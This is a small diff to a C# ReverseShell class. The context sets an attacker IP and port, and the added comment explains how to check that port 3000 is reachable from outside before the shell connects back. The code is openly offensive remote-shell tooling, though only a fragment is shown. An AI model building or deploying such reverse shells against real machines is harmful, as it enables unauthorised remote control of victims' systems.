@@ -298,6 +298,7 @@ class ReverseShell
         string attackerIP = "127.0.0.1"; // change this to your PUBLIC IP
         int attackerPort = 3000;
 
+        // run server.exe/cs then go to canyouseeme.org and check on port 3000 to ensure it works
         try
         {
             Console.WriteLine("[+] Attempting to connect to server..."); 
